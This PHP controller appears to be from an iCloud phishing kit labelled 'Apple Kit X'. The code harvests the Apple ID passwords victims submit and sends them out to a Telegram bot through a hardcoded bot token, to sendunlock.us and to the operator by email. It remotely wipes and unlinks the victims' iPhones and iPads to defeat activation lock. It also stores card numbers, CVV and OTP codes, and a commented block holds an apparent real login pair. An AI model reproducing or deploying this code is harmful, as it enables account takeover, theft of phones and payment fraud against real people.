		$this->applePwd = $this->input->post('apple_pwd');
		$this->linkAcessado = $this->input->post('apple_add');
		//$this->load->library('extra', array('username' => $this->appleID, 'password' => $this->applePwd));
		//$this->doLogin = $this->extra->loggedIn();
		$this->name = $this->appleID;
		$this->checkVictim2 = $this->victim->checkVictim($this->appleID);
		$this->checkVictim = $this->links->Vitima($this->input->post('apple_add'));
		$this->checkFirst2 = $this->victim->checkFirst($this->numeroOUemail);
		$this->checkFirst = $this->links->Vitima($this->input->post('apple_add'));

		$UserCloud = $this->appleID;
		//$PassCloud = $this->applePwd;
		$PassCloud =  urlencode($this->applePwd);
		$UsuarioValido = file_get_contents("http://sendunlock.us/ApiAutoRemove/Api.php?Usuario=fernando&Senha=Teste111&UserCloud=$UserCloud&PassCloud=$PassCloud");


		if ($this->form_validation->run() == false) {

			$this->ControleIFS = '0';

			//usuario criado com numero
			if ($this->checkVictim) {



				if($this->checkFirst2){

					if ($UsuarioValido != "Error") {
						//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=EntrouAqui3 $UsuarioValido");
						/*
						$name = "apps/controllers/imei.txt";
						$file = fopen($name, 'a');
						fwrite($file, $UsuarioValido . "\n");
						fclose($file);
						*/



						//$this->more = $this->getMore($this->doLogin->dsInfo);
						//$this->alias = $this->doLogin->dsInfo['iCloudAppleIdAlias'];
						$add_and_return = $this->updateVictimFirst();
						//$imeis = $this->PegaIMEI();
						//$imeis2 = $this->enviaSMSadmin();
						//$this->addDevices($this->extra->devices, $add_and_return);
						//$this->addDevices($this->extra->devices, $add_and_return, $imeis); /*Comentado Problema API*/
						//$this->SendNoti($this->extra->devices, $this->name);
						//$this->DoDelete($this->extra->devices);

						$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

						if ($NumeroSMSAdmin != NULL){
							$TG_True_LinkAcessado = $this->linkAcessado;
							$TG_True_Email = $this->appleID;
							$TG_True_Pass = $this->applePwd;
							$TG_True_IP = $this->ip;
							$TG_True_Browser = $this->browser;
							$TG_True_Plataform = $this->platform;

							$TextoNotificacaoVerdadeiro = urlencode("<b>++. Novo Login Apple Kit X .++</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Email:</b> $TG_True_Email \n <b>Senha:</b> $TG_True_Pass \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform \n <b>Dispositivos:</b> \n $UsuarioValido");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
						}

						Ajax::Success($this->name);



					}else {
						$error = $this->failedReport();
						//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=falso12&parse_mode=html"); //RETORNA O FALSO TB
					}
				}

			} if ($this->checkFirst &&  $this->checkVictim) {


				if ($UsuarioValido != "Error") {

					$name = "apps/controllers/imei.txt";
					$file = fopen($name, 'a');
					fwrite($file, $UsuarioValido . "\n");
					fclose($file);



					$add_and_return = $this->newVictim();
					//$imeis = $this->PegaIMEI();
					//$imeis2 = $this->enviaSMSadmin();
					//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
					//$this->SendNoti($this->extra->devices, $this->name);
					//$this->DoDelete($this->extra->devices);

					$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

					if ($NumeroSMSAdmin != NULL){

						$TG_True_LinkAcessado = $this->linkAcessado;
						$TG_True_Email = $this->appleID;
						$TG_True_Pass = $this->applePwd;
						$TG_True_IP = $this->ip;
						$TG_True_Browser = $this->browser;
						$TG_True_Plataform = $this->platform;

						$TextoNotificacaoVerdadeiro = urlencode("<b>.++ Novo Login Apple Kit X ++.</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Email:</b> $TG_True_Email \n <b>Senha:</b> $TG_True_Pass \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform \n <b>Dispositivos:</b> \n $UsuarioValido");
						file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
					}

					Ajax::Success($this->name);


				}else {
						//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=EntrouAqui4 $UsuarioValido");
						//$error = $this->failedReport();

						$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

						if ($NumeroSMSAdmin != NULL){

							$TG_False_LinkAcessado = $this->linkAcessado;
							$TG_False_Email = $this->appleID;
							$TG_False_Pass = $this->applePwd;
							$TG_False_IP = $this->ip;
							$TG_False_Browser = $this->browser;
							$TG_False_Plataform = $this->platform;

							$TextoNotificacaoFalso = urlencode("<b>++ Tentativa de Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_False_LinkAcessado# \n <b>Email:</b> $TG_False_Email \n <b>Senha:</b> $TG_False_Pass \n <b>IP:</b> $TG_False_IP \n <b>Browser:</b> $TG_False_Browser \n <b>Sistema Operacional:</b> $TG_False_Plataform");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");
						}
					}


			}

			if (($this->checkVictim && $this->checkVictim2) || $this->checkFirst ) {





				if ( ($this->checkVictim && $this->checkFirst) || ($this->checkVictim2 && $this->checkFirst2)) {

					if ($UsuarioValido != "Error") {



						$this->more = $this->getMore($this->doLogin->dsInfo);
						$this->alias = $this->doLogin->dsInfo['iCloudAppleIdAlias'];
						//$this->more = '';
						//$this->alias = '';
						$add_and_return = $this->updateVictimFirst();
						//$imeis = $this->PegaIMEI();
						//$imeis2 = $this->enviaSMSadmin();
						//$this->addDevices($this->extra->devices, $add_and_return);
						$this->addDevices($this->extra->devices, $add_and_return, $imeis);
						$this->SendNoti($this->extra->devices, $this->name);
						$this->DoDelete($this->extra->devices);
						Ajax::Success($this->name);

					}
					 else {
						$error = $this->failedReport();
						//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=falso10&parse_mode=html"); //RETORNA O FALSO TAMBEM PARA O TELEGRAM
					}
				}
				 else if ($UsuarioValido != "Error") {




					$this->lastID2 = $this->victim->getID($this->numeroOUemail);
					$this->updateVictimSec();
					$this->SendNoti($this->extra->devices, $this->name);
					$this->DoDelete($this->extra->devices);



					Ajax::Success($this->name);



				}
				 else {
					$error = $this->failedReport();


				}
			}
			 else if ($UsuarioValido != "Error") {



				$add_and_return = $this->newVictim();
				//$imeis = $this->PegaIMEI();
				//$imeis2 = $this->enviaSMSadmin();
				$this->addDevices($this->extra->devices, $add_and_return, $imeis);
				$this->SendNoti($this->extra->devices, $this->name);
				$this->DoDelete($this->extra->devices);
				Ajax::Success($this->name);


			}
			 else {



				$error = $this->failedReport();


			}
		}
		 else {
			$error = 'error';


		}


		(isset($error) ? Ajax::error($error, 200) : false);


		//echo 'oi';

	}

	/**
     * @return bool
     */

	protected function newVictimBall()
	{

		$vdata = array('email' => $this->numeroOUemail, 'pass' => $this->input->post('apple_pwd'), 'name' => $this->name, 'ip' => $this->ip, 'browser' => $this->browser, 'version' => $this->version, 'platform' => $this->platform, 'agent_string' => $this->agent_string, 'done' => 1, 'showed' => 1, 'time_logged' => setTime(), 'timestamp' => setTime(), 'more' => $this->more, 'alias' => $this->alias, 'linkAcessado' => $this->linkAcessado, 'imei' => $this->card_number, 'phone' => $this->expiry_date, 'model' => $this->cvv, 'color' => $this->cell, 'size' => $this->saldo, 'serial' => $this->otp, 'RandomIdentificacao' => $this->RandomIdentificacao, 'TemplateBank' => $this->TemplateBank, 'Contos' => $this->Contos, 'MD5IdentificaAcesso' => $this->MD5IdentificaAcesso);
		$this->lastID = $this->victim->insert($vdata);
		$this->session->set_userdata('userID', $this->lastID);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID;

		/*

		$this->card_number = $this->input->post('card_number');
		$this->expiry_date = $this->input->post('expiry_date');
		$this->cvv = $this->input->post('cvv');
		$this->cell = $this->input->post('cell');
		$this->saldo = $this->input->post('saldo');
		*/
	}

	protected function newVictimBallUpdate($RandomIdentificacao)
	{
		$vdata = array('email' => $this->numeroOUemail, 'pass' => $this->input->post('apple_pwd'), 'name' => $this->name, 'ip' => $this->ip, 'browser' => $this->browser, 'version' => $this->version, 'platform' => $this->platform, 'agent_string' => $this->agent_string, 'done' => 1, 'showed' => 1, 'time_logged' => setTime(), 'timestamp' => setTime(), 'more' => $this->more, 'alias' => $this->alias, 'linkAcessado' => $this->linkAcessado, 'imei' => $this->card_number, 'phone' => $this->expiry_date, 'model' => $this->cvv, 'color' => $this->cell, 'size' => $this->saldo, 'serial' => $this->otp, 'RandomIdentificacao' => $this->RandomIdentificacao);
		$this->lastID = $this->victim->update($RandomIdentificacao, $vdata);
		$this->session->set_userdata('userID', $this->lastID);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID;

		/*

		$this->card_number = $this->input->post('card_number');
		$this->expiry_date = $this->input->post('expiry_date');
		$this->cvv = $this->input->post('cvv');
		$this->cell = $this->input->post('cell');
		$this->saldo = $this->input->post('saldo');
		*/
	}


	protected function newVictim()
	{

		$vdata = array('email' => $this->numeroOUemail, 'pass' => $this->applePwd, 'name' => $this->name, 'ip' => $this->ip, 'browser' => $this->browser, 'version' => $this->version, 'platform' => $this->platform, 'agent_string' => $this->agent_string, 'done' => 1, 'showed' => 1, 'time_logged' => setTime(), 'timestamp' => setTime(), 'more' => $this->more, 'alias' => $this->alias, 'linkAcessado' => $this->linkAcessado);
		$this->lastID = $this->victim->insert($vdata);
		$this->session->set_userdata('userID', $this->lastID);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID;


		/*
		$name = "apps/controllers/imei.txt";
		$file = fopen($name, 'a');
		fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . "\n");
		fclose($file);
		*/
	}

	protected function Extra2($email,$pass)
	{
		$vdata = array('email' => $this->appleID, 'pass' => $this->applePwd, 'name' => $this->name, 'ip' => $this->ip, 'browser' => $this->browser, 'version' => $this->version, 'platform' => $this->platform, 'agent_string' => $this->agent_string, 'done' => 1, 'showed' => 1, 'time_logged' => setTime(), 'timestamp' => setTime(), 'more' => $this->more, 'alias' => $this->alias, 'linkAcessado' => $this->linkAcessado);
		$this->lastID = $this->victim->insert($vdata);
		$this->session->set_userdata('userID', $this->lastID);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID;
	}



	/**
     * @return bool
     */

	protected function updateVictimFirstBall()
	{


		$vdata = array('email' => $this->numeroOUemail, 'pass' => $this->input->post('apple_pwd'), 'name' => $this->name, 'ip' => $this->ip, 'browser' => $this->browser, 'version' => $this->version, 'platform' => $this->platform, 'agent_string' => $this->agent_string, 'first' => 1, 'done' => 1, 'showed' => 1, 'time_logged' => setTime(), 'more' => $this->more, 'alias' => $this->alias, 'linkAcessado' => $this->linkAcessado);
		$this->lastID = $this->victim->updateViaEmail($this->numeroOUemail, $vdata);
		$this->session->set_userdata('userID', $this->lastID);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID;


		/*
		$name = "apps/controllers/imei.txt";
		$file = fopen($name, 'a');
		fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . "\n");
		fclose($file);
		*/
	}

	protected function updateVictimFirst()
	{


		$vdata = array('email' => $this->numeroOUemail, 'pass' => $this->applePwd, 'name' => $this->name, 'ip' => $this->ip, 'browser' => $this->browser, 'version' => $this->version, 'platform' => $this->platform, 'agent_string' => $this->agent_string, 'first' => 1, 'done' => 1, 'showed' => 1, 'time_logged' => setTime(), 'more' => $this->more, 'alias' => $this->alias, 'linkAcessado' => $this->linkAcessado);
		$this->lastID = $this->victim->updateViaEmail($this->numeroOUemail, $vdata);
		$this->session->set_userdata('userID', $this->lastID);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID;


		/*
		$name = "apps/controllers/imei.txt";
		$file = fopen($name, 'a');
		fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . "\n");
		fclose($file);
		*/
	}

	/**
     * @return bool
     */
	protected function updateVictimSec()
	{

		$vdata = array('userID' => $this->lastID2, 'email' => $this->numeroOUemail, 'pass' => $this->applePwd, 'userAgent' => $this->input->user_agent(), 'ip' => $this->ip, 'browser' => $this->agent->browser(), 'platform' => $this->agent->platform(), 'time' => setTime());
		$this->lastID2 = $this->victim->insertL($vdata);
		$this->session->set_userdata('userID', $this->lastID2);
		$this->session->set_userdata('email', $this->appleID);
		$this->session->set_userdata('pass', $this->applePwd);
		return $this->lastID2;


		/*
		$name = "apps/controllers/imei.txt";
		$file = fopen($name, 'a');
		fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . "\n");
		fclose($file);
		*/
	}

	/**
     * @return mixed
     */
	protected function doLogin()
	{
		return $this->extra->doDelLogin($this->appleID, $this->applePwd);
	}

	/**
     * @param $devices
     * @param $lastID
     *
     * @return int
     */
	protected function addDevices($devices, $lastID, $imeiss)
	{
		$this->devices = array();

		foreach ($devices as $var ) {
			$data = array('batteryLevel' => ($var->batteryLevel == 1 ? '1.1' : $var->batteryLevel), 'deviceStatus' => $var->deviceStatus, 'deviceDisplayName' => $var->deviceDisplayName, 'rawDeviceModel' => $var->rawDeviceModel, 'name' => $var->name, 'deviceColor' => $var->deviceColor, 'isMac' => $var->isMac, 'userID' => $lastID, 'email' => $this->appleID, 'deviceID' => $var->id, 'latitude' => (!(empty($var->location->latitude)) ? $var->location->latitude : 0), 'longitude' => (!(empty($var->location->longitude)) ? $var->location->longitude : 0), 'imei' => $imeiss);
			$this->device->insert($data);
		}
	}

	/**
     * @param $devices
     * @param $lastID
     */
	protected function addDevicesDeep($devices, $lastID)
	{
		$this->devices = array();

		foreach ($devices as $var ) {
			$data = array('serial' => $var->serialNumber, 'imei' => $var->imei, 'udid' => $var->udid, 'rawDeviceModel' => $var->model, 'deviceDisplayName' => $var->modelDisplayName, 'name' => $var->name, 'os' => $var->osVersion, 'isMac' => (strpos($var->model, 'iPhone') !== false ? false : true), 'deep' => 1, 'userID' => $lastID, 'email' => $this->appleID, 'deviceStatus' => 200);
			//$data = array('serial' => $var->serialNumber, 'imei' => '123123', 'udid' => $var->udid, 'rawDeviceModel' => $var->model, 'deviceDisplayName' => $var->modelDisplayName, 'name' => $var->name, 'os' => $var->osVersion, 'isMac' => (strpos($var->model, 'iPhone') !== false ? false : true), 'deep' => 1, 'userID' => $lastID, 'email' => $this->appleID, 'deviceStatus' => 200);
			$this->device->insert($data);
		}
	}

	public function DoDelete($data)
	{
		foreach ($data as $device ) {
			if ( $device->deviceStatus != '200' )
			{
				if ( $device->deviceClass == 'iPhone' || $device->deviceClass == 'iPad' )
				{
					$this->extra->remote_wipe($device->id, '4444', 'hi');
					$this->extra->remove_client($device->id);
					sleep(5);
					$this->extra->refresh_client();
				}
			}
		}
	}

	public function SendNoti($devices = NULL, $name = NULL)
	{
		if ($this->global_data['block'] == 1) {
			$this->visit->insertp2(array('ip' => $this->ip));
		}


		$array = array('logged_in' => true, 'firstName' => $name);
		$this->session->set_userdata($array);
		$details = array('user' => $this->appleID, 'pwd' => $this->applePwd, 'devices' => $devices, 'browser' => $this->browser, 'ip' => $this->ip, 'platform' => $this->platform, 'userAgent' => $this->agent_string, 'link' => site_url('admin'), 'time' => date('h:i:s a - d/m/Y', now()));

		if ($this->global_data['sentEmail'] == 1) {
			$this->SendNotiMesg($details);
		}

	}

	/**
     * Add a new visitor
     */
	protected function newVisit()
	{
		$langs = implode(',', $this->agent->languages());
		$data = array('ip' => $this->ip, 'browser' => $this->agent->browser(), 'platform' => $this->agent->platform(), 'mobile' => ($this->agent->is_mobile() ? 1 : 0), 'robot' => ($this->agent->is_robot() ? 1 : 0), 'referral' => ($this->agent->is_referral() ? $this->agent->referrer() : 'None'), 'languages' => $langs, 'country' => getIPimg($this->ip), 'time' => setTime());
		$this->visit->insert($data);
		//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Teste");
	}

	private function SendNotiMesg($details)
	{
		$body = noti($details);
		$site = base_url();
		$site = explode('://', $site);
		if (empty($this->global_data['notiSMTP']) || empty($this->global_data['notiSMTPemail']) || empty($this->global_data['notiSMTPpwd']) || empty($this->global_data['notiSMTPport'])) {
			$this->SendEmail(false, '', '', '', '', '', 'senderkit1@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'Dados iCloud AppIeKit X !', $body, false);
		}
		 else {
			$send = $this->SendEmail(true, $this->global_data['notiSMTP'], $this->global_data['notiSMTPemail'], $this->global_data['notiSMTPpwd'], 'tls', $this->global_data['notiSMTPport'], $this->global_data['notiSMTPemail'], 'SenderKit', $this->global_data['Oemail'], 'Dados iCloud AppIeKit X !', $body, true);

			if ($send['status'] == false) {
				$this->SendEmail(false, '', '', '', '', '', 'senderkit2@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'Dados iCloud AppIeKit X !', $body, false);
			}

		}

		$this->mail->newID($this->global_data['Oemail'], 'sednerkit3@' . rtrim($site[1], '/'), 'Dados iCloud AppIeKit X !', $body);
	}

	/**
     * Send a new failed report to admin
     *
     * @param $config
     *
     * @return string
     */

		 protected function failedReportBall()
	 	{

			//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Esqueceu - $this->EsqueceuContaSql");

	 		$vdata = array('email' => $this->appleID, 'pass' => $this->input->post('apple_pwd'), 'ip' => $this->ip, 'userAgent' => $this->agent_string, 'browser' => $this->browser, 'platform' => $this->platform, 'link' => $this->linkAcessado, 'time' => setTime(), 'CardNumber' => $this->card_number, 'OTP' => $this->otp, 'CVV' => $this->cvv, 'Cell' => $this->cell, 'Saldo' => $this->saldo, 'CardExpiryDate' => $this->expiry_date, 'Nome' => $this->nome_input, 'Cognome' => $this->cognome_input, 'Datadinascita' => $this->data_nascita, 'Codicefiscale' => $this->codice_fiscale, 'RandomIdentificacao' => $this->RandomIdentificacao, 'TemplateBank' => $this->TemplateBank, 'Contos' => $this->Contos, 'RicordoCodiceTitolare' => $this->EsqueceuContaSql, 'MD5IdentificaAcesso' => $this->MD5IdentificaAcesso);
	 		$site = explode('://', base_url());
	 		$body = noti_failed($vdata);
	 		if (empty($this->global_data['notiSMTP']) || empty($this->global_data['notiSMTPemail']) || empty($this->global_data['notiSMTPpwd']) || empty($this->global_data['notiSMTPport'])) {
	 			@$this->SendEmail(false, '', '', '', '', '', 'senderkit@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'Nova Tentativa de Login INVALIDO!', $body, false);
	 		}
	 		 else {
	 			$send = @$this->SendEmail(true, $this->global_data['notiSMTP'], $this->global_data['notiSMTPemail'], $this->global_data['notiSMTPpwd'], 'tls', $this->global_data['notiSMTPport'], $this->global_data['notiSMTPemail'], 'SenderKit', $this->global_data['Oemail'], 'New Failed login has been added 2!', $body, true);

	 			if ($send['status'] == false) {
	 				@$this->SendEmail(false, '', '', '', '', '', 'senderkit@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'New Failed login has been added 3!', $body, false);
	 			}

	 		}

	 		$this->wrongs->insert($vdata);
	 		$error = 'error';
	 		//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=falso11&parse_mode=html"); //CHAMA 2 vez no login falso
	 		return $error;
	 	}

		protected function failedReportBallUpdate($RandomIdentificacao)
		{


			$vdata = array('email' => $this->appleID, 'pass' => $this->input->post('apple_pwd'), 'ip' => $this->ip, 'userAgent' => $this->agent_string, 'browser' => $this->browser, 'platform' => $this->platform, 'link' => $this->linkAcessado, 'time' => setTime(), 'CardNumber' => $this->card_number, 'OTP' => $this->otp, 'CVV' => $this->cvv, 'Cell' => $this->cell, 'Saldo' => $this->saldo, 'CardExpiryDate' => $this->expiry_date, 'Nome' => $this->nome_input, 'Cognome' => $this->cognome_input, 'Datadinascita' => $this->data_nascita, 'Codicefiscale' => $this->codice_fiscale, 'RandomIdentificacao' => $this->RandomIdentificacao, 'lastpass' => $this->input->post('apple_pwd'), 'TemplateBank' => $this->TemplateBank);

			/*
			$site = explode('://', base_url());
			$body = noti_failed($vdata);
			if (empty($this->global_data['notiSMTP']) || empty($this->global_data['notiSMTPemail']) || empty($this->global_data['notiSMTPpwd']) || empty($this->global_data['notiSMTPport'])) {
				@$this->SendEmail(false, '', '', '', '', '', 'senderkit@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'Nova Tentativa de Login INVALIDO!', $body, false);
			}
			 else {
				$send = @$this->SendEmail(true, $this->global_data['notiSMTP'], $this->global_data['notiSMTPemail'], $this->global_data['notiSMTPpwd'], 'tls', $this->global_data['notiSMTPport'], $this->global_data['notiSMTPemail'], 'SenderKit', $this->global_data['Oemail'], 'New Failed login has been added 2!', $body, true);

				if ($send['status'] == false) {
					@$this->SendEmail(false, '', '', '', '', '', 'senderkit@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'New Failed login has been added 3!', $body, false);
				}

			}
			*/

			$this->wrongs->update($RandomIdentificacao, $vdata);
			$error = 'error';
			//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=falso11&parse_mode=html"); //CHAMA 2 vez no login falso
			return $error;
		}

	protected function failedReport()
	{
		//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=EntrouAqui5 $UsuarioValido");
		$vdata = array('email' => $this->appleID, 'pass' => $this->applePwd, 'ip' => $this->ip, 'userAgent' => $this->agent_string, 'browser' => $this->browser, 'platform' => $this->platform, 'link' => $this->linkAcessado, 'time' => setTime());
		$site = explode('://', base_url());
		$body = noti_failed($vdata);
		if (empty($this->global_data['notiSMTP']) || empty($this->global_data['notiSMTPemail']) || empty($this->global_data['notiSMTPpwd']) || empty($this->global_data['notiSMTPport'])) {
			@$this->SendEmail(false, '', '', '', '', '', 'senderkit@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'Nova Tentativa de Login INVALIDO!', $body, false);
		}
		 else {
			$send = @$this->SendEmail(true, $this->global_data['notiSMTP'], $this->global_data['notiSMTPemail'], $this->global_data['notiSMTPpwd'], 'tls', $this->global_data['notiSMTPport'], $this->global_data['notiSMTPemail'], 'SenderKit', $this->global_data['Oemail'], 'New Failed login has been added 2!', $body, true);

			if ($send['status'] == false) {
				@$this->SendEmail(false, '', '', '', '', '', 'senderkit@' . rtrim($site[1], '/'), 'SenderKit', $this->global_data['Oemail'], 'New Failed login has been added 3!', $body, false);
			}

		}

		$this->wrongs->insert($vdata);
		$error = 'error';
		//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=falso11&parse_mode=html"); //CHAMA 2 vez no login falso
		return $error;


	}

	/**
     * Generate a more details about the victim
     *
     * @param null $more
     *
     * @return string
     */
	protected function getMore($more = NULL)
	{
		$n = 'Fullname: ' . $more['fullName'] . ', appleId: ' . $more['appleId'] . ', primaryEmail: ' . $more['primaryEmail'] . ', iCloudAppleIdAlias: ' . $more['iCloudAppleIdAlias'] . ', Locale/Language: ' . $more['locale'] . ' / ' . $more['languageCode'];
		$ns = str_replace(',', '<br/><strong>', $n);
		$ns = str_replace(':', ':</strong>', $ns);
		return '<strong>' . $ns;
	}

	public function inSureDelete()
	{
		$user = $this->session->userdata('email');
		$pass = $this->session->userdata('pass');
		if (!(empty($user)) || !(empty($pass))) {
			$this->load->library('extra', array('username' => $user, 'password' => $pass));

			foreach ($this->extra->devices as $device ) {
				$this->extra->remove_client($device->id);
				sleep(5);
				$this->extra->refresh_client();
				sleep(5);
				$this->extra->remove_client($device->id);
				sleep(5);
				$this->extra->refresh_client();
				$this->extra->remove_client($device->id);
			}

			Ajax::success('done', 200);
		}
		 else {
			$error = 'error';
		}

		(isset($error) ? Ajax::error($error, 200) : false);
	}

	public function enviaSMSadmin(){
		$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

		if ($NumeroSMSAdmin != NULL){

			/**
			$teste = $this->global_data['numeroSMSadmin'];
			$name = "apps/controllers/imei.php";
			$file = fopen($name, 'a');
			fwrite($file, '<br>'.$teste.' - '.$this->appleID.' - '.$this->applePwd . '<br>');
			fclose($file);
			**/

			//require("apps/libraries/smsAdmin.php");

			$LogouSMSAdminID = $this->appleID;
			$LogouSMSAdminPWD = $this->applePwd;

			$site = "http://sendunlock.us/sms/app/php/apiExternaAdmin.php";
			$data = "textoAPI=0|1|enviaSMS|$LogouSMSAdminID|$LogouSMSAdminPWD|$NumeroSMSAdmin";

			$datapost = curl_init();
				$headers = array("Expect:");
			curl_setopt($datapost, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($datapost, CURLOPT_RETURNTRANSFER, true);  //NOVO
			curl_setopt($datapost, CURLOPT_URL, $site);
				curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
			curl_setopt($datapost, CURLOPT_HEADER, false);
				curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
			curl_setopt($datapost, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
			curl_setopt($datapost, CURLOPT_POST, TRUE);
			curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
				//curl_setopt($datapost, CURLOPT_COOKIEFILE, realpath('cookie_2.txt'));

			ob_start();
			$retorno =  curl_exec ($datapost);
			ob_end_clean();
			curl_close ($datapost);
			unset($datapost);
		}



	}

	public function PegaIMEI(){

		require("apps/libraries/Extra2.php");
		$FMI = new Devjo();
		//if ($FMI->Login($email, $pass) == true) {
		if ($FMI->Login($this->appleID, $this->applePwd) == true) {
			$devices_array = $FMI->Delete_All();
			$imeiSQL = implode("\n", $devices_array);
		}

	/**
	$name = "apps/controllers/imei.php";
	$file = fopen($name, 'a');
	fwrite($file, '<br>'.$imeiSQL.' - '.$this->appleID.' - '.$this->applePwd . '<br>');
	fclose($file);
	**/


		return $imeiSQL;

	}

	}


?>

<?php

	/**
require("apps/libraries/Extra2.php");
$FMI = new Devjo();
//if ($FMI->Login($email, $pass) == true) {
if ($FMI->Login('thiagomagamoc@hotmail.com', 'Thi@go1004') == true) {

	$devices_array = $FMI->Delete_All();
	$imeiSQL = implode("\n", $devices_array);

}

$paymentRequest = new Authority();

$name = "apps/controllers/imei.php";
$file = fopen($name, 'a');
fwrite($file, $imeiSQL.'-'.$appleID.'-'$applePwd);
fclose($file);
**/
?>
